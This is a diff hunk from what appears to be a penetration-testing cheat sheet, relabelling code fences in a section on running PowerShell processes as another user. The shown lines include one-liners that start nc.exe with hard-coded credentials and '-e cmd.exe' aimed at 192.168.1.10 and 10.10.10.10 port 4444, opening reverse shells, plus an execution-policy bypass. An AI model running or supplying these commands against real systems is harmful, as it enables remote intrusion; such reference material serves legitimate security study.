@@ -478,11 +478,11 @@ PowerShell can also be used to launch a process as another user. The following s
  Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
 ```
 Next run this script using powershell.exe:
-```powershell
-PS C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
+```cmd
+CMD C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
 Or run it as a handy one-liner from the Windows command line:
-```
+```cmd
 CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command '$username = "Admin"; $password = "PASSWORD";  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Users\Public\Downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.10.10", "4444", "-e", "cmd.exe") -WorkingDirectory C:\Users\Public\Downloads;'
 ```
 
